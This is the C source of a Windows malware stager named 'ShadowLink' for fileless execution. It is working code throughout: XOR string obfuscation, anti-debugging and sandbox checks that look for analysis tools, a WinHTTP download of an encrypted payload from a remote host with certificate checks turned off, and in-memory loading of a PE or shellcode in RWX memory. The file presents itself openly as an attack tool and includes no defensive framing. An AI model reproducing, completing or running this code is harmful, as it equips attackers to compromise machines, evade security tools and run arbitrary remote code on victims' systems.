/*
 * ShadowLink Stager/Loader Implementation
 * Phase 11: Fileless Execution
 * 
 * Compilation:
 *   Minimal: gcc -Os -s -o stager.exe stager.c -lwinhttp -mwindows
 *   With icon: windres stager.rc -o stager_res.o && gcc -Os -s -o stager.exe stager.c stager_res.o -lwinhttp -mwindows
 * 
 * Size target: < 15KB after stripping
 */

#include "stager.h"
#include <stdio.h>
#include <winhttp.h>
#include <tlhelp32.h>

#pragma comment(lib, "winhttp.lib")

// ============================================
// STRING OBFUSCATION
// ============================================

// Obfuscated strings (XOR with 0x5A)
// These are decoded at runtime to avoid static analysis

// "ntdll.dll" XOR 0x5A
static unsigned char s_ntdll[] = {0x34, 0x2e, 0x3e, 0x36, 0x36, 0x1a, 0x3e, 0x36, 0x36, 0x00};

// "kernel32.dll" XOR 0x5A  
static unsigned char s_kernel32[] = {0x31, 0x3f, 0x28, 0x34, 0x3f, 0x36, 0x6c, 0x68, 0x1a, 0x3e, 0x36, 0x36, 0x00};

void xor_decrypt_buffer(BYTE *data, DWORD size, BYTE key) {
    for (DWORD i = 0; i < size && data[i] != 0; i++) {
        data[i] ^= key;
    }
}

// Decode and return string (static buffer - not thread safe)
static char* decode_string(unsigned char *enc, DWORD len) {
    static char decoded[256];
    memcpy(decoded, enc, len);
    xor_decrypt_buffer((BYTE*)decoded, len, STAGER_XOR_KEY);
    return decoded;
}


// ============================================
// ANTI-ANALYSIS
// ============================================

BOOL is_debugger_attached(void) {
    // Method 1: IsDebuggerPresent
    if (IsDebuggerPresent()) {
        return TRUE;
    }
    
    // Method 2: CheckRemoteDebuggerPresent
    BOOL bDebugger = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebugger);
    if (bDebugger) {
        return TRUE;
    }
    
    // Method 3: NtGlobalFlag check (PEB)
#ifdef _WIN64
    DWORD64 peb = __readgsqword(0x60);
    DWORD ntGlobalFlag = *(DWORD*)((BYTE*)peb + 0xBC);
#else
    DWORD peb = __readfsdword(0x30);
    DWORD ntGlobalFlag = *(DWORD*)((BYTE*)peb + 0x68);
#endif
    
    // FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS
    if (ntGlobalFlag & 0x70) {
        return TRUE;
    }
    
    return FALSE;
}

BOOL is_sandbox_environment(void) {
    // Check for common sandbox indicators
    
    // 1. Low RAM (< 2GB)
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    if (memInfo.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) {
        return TRUE;
    }
    
    // 2. Few CPUs (< 2)
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) {
        return TRUE;
    }
    
    // 3. Recent files check - sandbox may have empty recent folder
    char recentPath[MAX_PATH];
    if (ExpandEnvironmentStringsA("%APPDATA%\\Microsoft\\Windows\\Recent", recentPath, MAX_PATH)) {
        WIN32_FIND_DATAA fd;
        char searchPath[MAX_PATH];
        snprintf(searchPath, MAX_PATH, "%s\\*.lnk", recentPath);
        HANDLE hFind = FindFirstFileA(searchPath, &fd);
        if (hFind == INVALID_HANDLE_VALUE) {
            return TRUE;  // No recent files
        }
        FindClose(hFind);
    }
    
    // 4. Check for analysis tools
    const char *analysis_processes[] = {
        "wireshark.exe", "procmon.exe", "procexp.exe", "x64dbg.exe",
        "ollydbg.exe", "ida.exe", "ida64.exe", "fiddler.exe", NULL
    };
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                for (int i = 0; analysis_processes[i] != NULL; i++) {
                    if (_stricmp(pe32.szExeFile, analysis_processes[i]) == 0) {
                        CloseHandle(hSnapshot);
                        return TRUE;
                    }
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    
    return FALSE;
}


// ============================================
// PAYLOAD DOWNLOAD
// ============================================

int stager_download_payload(PSTAGER_CONFIG pConfig, BYTE **ppPayload, DWORD *pdwSize) {
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    DWORD dwDownloaded = 0;
    DWORD dwTotalSize = 0;
    BYTE *pBuffer = NULL;
    DWORD dwBufferSize = 1024 * 1024 * 5;  // 5MB initial buffer
    int result = -1;
    
    // Open session
    hSession = WinHttpOpen(
        STAGER_USER_AGENT,
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );
    
    if (hSession == NULL) {
        goto cleanup;
    }
    
    // Connect to server
    hConnect = WinHttpConnect(
        hSession,
        pConfig->wszHost,
        (INTERNET_PORT)pConfig->dwPort,
        0
    );
    
    if (hConnect == NULL) {
        goto cleanup;
    }
    
    // Create request
    hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        pConfig->wszPath,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        (pConfig->dwPort == 443) ? WINHTTP_FLAG_SECURE : 0
    );
    
    if (hRequest == NULL) {
        goto cleanup;
    }
    
    // Ignore SSL errors for self-signed certs
    if (!pConfig->bSslVerify) {
        DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                        SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
    }
    
    // Send request
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        goto cleanup;
    }
    
    // Receive response
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        goto cleanup;
    }
    
    // Check status code
    DWORD dwStatusCode = 0;
    DWORD dwSize = sizeof(dwStatusCode);
    WinHttpQueryHeaders(hRequest,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX,
        &dwStatusCode, &dwSize, WINHTTP_NO_HEADER_INDEX);
    
    if (dwStatusCode != 200) {
        goto cleanup;
    }
    
    // Allocate buffer
    pBuffer = (BYTE*)VirtualAlloc(NULL, dwBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pBuffer == NULL) {
        goto cleanup;
    }
    
    // Read data
    do {
        DWORD dwAvailable = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &dwAvailable)) break;
        if (dwAvailable == 0) break;
        
        if (dwTotalSize + dwAvailable > dwBufferSize) {
            // Buffer too small
            break;
        }
        
        if (!WinHttpReadData(hRequest, pBuffer + dwTotalSize, dwAvailable, &dwDownloaded)) break;
        
        dwTotalSize += dwDownloaded;
        
    } while (dwDownloaded > 0);
    
    if (dwTotalSize > 0) {
        *ppPayload = pBuffer;
        *pdwSize = dwTotalSize;
        pBuffer = NULL;  // Don't free, caller owns it
        result = 0;
    }

cleanup:
    if (pBuffer != NULL) {
        VirtualFree(pBuffer, 0, MEM_RELEASE);
    }
    if (hRequest != NULL) WinHttpCloseHandle(hRequest);
    if (hConnect != NULL) WinHttpCloseHandle(hConnect);
    if (hSession != NULL) WinHttpCloseHandle(hSession);
    
    return result;
}


// ============================================
// PE EXECUTION IN MEMORY
// ============================================

// PE header structures
typedef struct _PE_HEADERS {
    PIMAGE_DOS_HEADER pDos;
    PIMAGE_NT_HEADERS pNt;
    PIMAGE_SECTION_HEADER pSections;
    DWORD dwNumSections;
} PE_HEADERS;

BOOL parse_pe_headers(BYTE *pPE, PE_HEADERS *pHeaders) {
    pHeaders->pDos = (PIMAGE_DOS_HEADER)pPE;
    
    if (pHeaders->pDos->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }
    
    pHeaders->pNt = (PIMAGE_NT_HEADERS)(pPE + pHeaders->pDos->e_lfanew);
    
    if (pHeaders->pNt->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }
    
    pHeaders->pSections = IMAGE_FIRST_SECTION(pHeaders->pNt);
    pHeaders->dwNumSections = pHeaders->pNt->FileHeader.NumberOfSections;
    
    return TRUE;
}

// Execute PE in current process memory
int execute_pe_in_memory(BYTE *pPE, DWORD dwSize) {
    PE_HEADERS headers;
    BYTE *pImage = NULL;
    DWORD dwImageSize;
    
    // Parse PE headers
    if (!parse_pe_headers(pPE, &headers)) {
        return -1;
    }
    
    // Get image size
    dwImageSize = headers.pNt->OptionalHeader.SizeOfImage;
    
    // Allocate memory for the image
    pImage = (BYTE*)VirtualAlloc(
        (LPVOID)headers.pNt->OptionalHeader.ImageBase,
        dwImageSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    // If preferred base not available, allocate anywhere
    if (pImage == NULL) {
        pImage = (BYTE*)VirtualAlloc(
            NULL,
            dwImageSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
    }
    
    if (pImage == NULL) {
        return -2;
    }
    
    // Copy headers
    memcpy(pImage, pPE, headers.pNt->OptionalHeader.SizeOfHeaders);
    
    // Copy sections
    for (DWORD i = 0; i < headers.dwNumSections; i++) {
        if (headers.pSections[i].SizeOfRawData > 0) {
            memcpy(
                pImage + headers.pSections[i].VirtualAddress,
                pPE + headers.pSections[i].PointerToRawData,
                headers.pSections[i].SizeOfRawData
            );
        }
    }
    
    // Calculate delta for relocations
    DWORD64 delta = (DWORD64)pImage - headers.pNt->OptionalHeader.ImageBase;
    
    // Apply relocations if needed
    if (delta != 0 && headers.pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0) {
        PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)(
            pImage + headers.pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress
        );
        
        while (pReloc->VirtualAddress != 0) {
            DWORD dwNumEntries = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD *pEntry = (WORD*)((BYTE*)pReloc + sizeof(IMAGE_BASE_RELOCATION));
            
            for (DWORD j = 0; j < dwNumEntries; j++) {
                if (pEntry[j] >> 12 == IMAGE_REL_BASED_DIR64) {
                    DWORD64 *pPatch = (DWORD64*)(pImage + pReloc->VirtualAddress + (pEntry[j] & 0xFFF));
                    *pPatch += delta;
                } else if (pEntry[j] >> 12 == IMAGE_REL_BASED_HIGHLOW) {
                    DWORD *pPatch = (DWORD*)(pImage + pReloc->VirtualAddress + (pEntry[j] & 0xFFF));
                    *pPatch += (DWORD)delta;
                }
            }
            
            pReloc = (PIMAGE_BASE_RELOCATION)((BYTE*)pReloc + pReloc->SizeOfBlock);
        }
    }
    
    // Resolve imports
    if (headers.pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size > 0) {
        PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)(
            pImage + headers.pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress
        );
        
        while (pImport->Name != 0) {
            char *pDllName = (char*)(pImage + pImport->Name);
            HMODULE hDll = LoadLibraryA(pDllName);
            
            if (hDll == NULL) {
                pImport++;
                continue;
            }
            
            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)(pImage + pImport->OriginalFirstThunk);
            PIMAGE_THUNK_DATA pIat = (PIMAGE_THUNK_DATA)(pImage + pImport->FirstThunk);
            
            while (pThunk->u1.AddressOfData != 0) {
                FARPROC pFunc = NULL;
                
                if (pThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                    pFunc = GetProcAddress(hDll, (LPCSTR)(pThunk->u1.Ordinal & 0xFFFF));
                } else {
                    PIMAGE_IMPORT_BY_NAME pName = (PIMAGE_IMPORT_BY_NAME)(pImage + pThunk->u1.AddressOfData);
                    pFunc = GetProcAddress(hDll, pName->Name);
                }
                
                if (pFunc != NULL) {
                    pIat->u1.Function = (DWORD64)pFunc;
                }
                
                pThunk++;
                pIat++;
            }
            
            pImport++;
        }
    }
    
    // Fix section permissions
    for (DWORD i = 0; i < headers.dwNumSections; i++) {
        DWORD dwProtect = PAGE_READONLY;
        
        if (headers.pSections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            if (headers.pSections[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
                dwProtect = PAGE_EXECUTE_READWRITE;
            } else {
                dwProtect = PAGE_EXECUTE_READ;
            }
        } else if (headers.pSections[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
            dwProtect = PAGE_READWRITE;
        }
        
        DWORD dwOldProtect;
        VirtualProtect(
            pImage + headers.pSections[i].VirtualAddress,
            headers.pSections[i].Misc.VirtualSize,
            dwProtect,
            &dwOldProtect
        );
    }
    
    // Get entry point
    typedef int (*EntryPointFunc)(void);
    EntryPointFunc pEntryPoint = (EntryPointFunc)(pImage + headers.pNt->OptionalHeader.AddressOfEntryPoint);
    
    // Call entry point
    return pEntryPoint();
}


// Execute raw shellcode
int execute_shellcode(BYTE *pShellcode, DWORD dwSize) {
    // Allocate RWX memory
    void *pMem = VirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pMem == NULL) {
        return -1;
    }
    
    // Copy shellcode
    memcpy(pMem, pShellcode, dwSize);
    
    // Execute
    typedef void (*ShellcodeFunc)(void);
    ShellcodeFunc pFunc = (ShellcodeFunc)pMem;
    pFunc();
    
    // Note: Shellcode may not return
    VirtualFree(pMem, 0, MEM_RELEASE);
    return 0;
}


// ============================================
// STAGER MAIN
// ============================================

int stager_init(PSTAGER_CONFIG pConfig) {
    if (pConfig == NULL) return -1;
    
    // Default configuration if not set
    if (pConfig->wszHost[0] == L'\0') {
        wcscpy(pConfig->wszHost, PAYLOAD_HOST);
    }
    if (pConfig->dwPort == 0) {
        pConfig->dwPort = PAYLOAD_PORT;
    }
    if (pConfig->wszPath[0] == L'\0') {
        wcscpy(pConfig->wszPath, PAYLOAD_PATH);
    }
    if (pConfig->dwRetryCount == 0) {
        pConfig->dwRetryCount = 3;
    }
    if (pConfig->dwRetryDelay == 0) {
        pConfig->dwRetryDelay = 5000;
    }
    
    return 0;
}

int stager_execute_payload(BYTE *pPayload, DWORD dwSize, EXECUTION_METHOD method) {
    // Check for PE signature
    if (dwSize >= 2 && pPayload[0] == 'M' && pPayload[1] == 'Z') {
        // It's a PE file
        return execute_pe_in_memory(pPayload, dwSize);
    }
    
    // Otherwise treat as shellcode
    return execute_shellcode(pPayload, dwSize);
}

void stager_cleanup(void) {
    // Nothing to clean up in minimal implementation
}


// ============================================
// MAIN ENTRY POINT
// ============================================

#ifdef BUILD_STAGER_EXE

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    STAGER_CONFIG config = {0};
    BYTE *pPayload = NULL;
    DWORD dwPayloadSize = 0;
    int result = 0;
    
    // Anti-analysis checks
    if (is_debugger_attached()) {
        ExitProcess(1);
    }
    
    // Optional: sandbox check (can be aggressive)
    // if (is_sandbox_environment()) {
    //     Sleep(60000);  // Sleep for a minute in sandbox
    //     ExitProcess(1);
    // }
    
    // Initialize config
    stager_init(&config);
    
    // Download payload with retries
    for (DWORD i = 0; i < config.dwRetryCount; i++) {
        result = stager_download_payload(&config, &pPayload, &dwPayloadSize);
        if (result == 0 && pPayload != NULL && dwPayloadSize > 0) {
            break;
        }
        Sleep(config.dwRetryDelay);
    }
    
    if (pPayload == NULL || dwPayloadSize == 0) {
        // Failed to download payload
        return 1;
    }
    
    // Decrypt payload if encrypted
    // The server should send XOR-encrypted payload
    xor_decrypt_buffer(pPayload, dwPayloadSize, STAGER_XOR_KEY);
    
    // Execute payload
    result = stager_execute_payload(pPayload, dwPayloadSize, EXEC_LOCAL);
    
    // Cleanup
    if (pPayload != NULL) {
        SecureZeroMemory(pPayload, dwPayloadSize);
        VirtualFree(pPayload, 0, MEM_RELEASE);
    }
    
    return result;
}

#endif // BUILD_STAGER_EXE
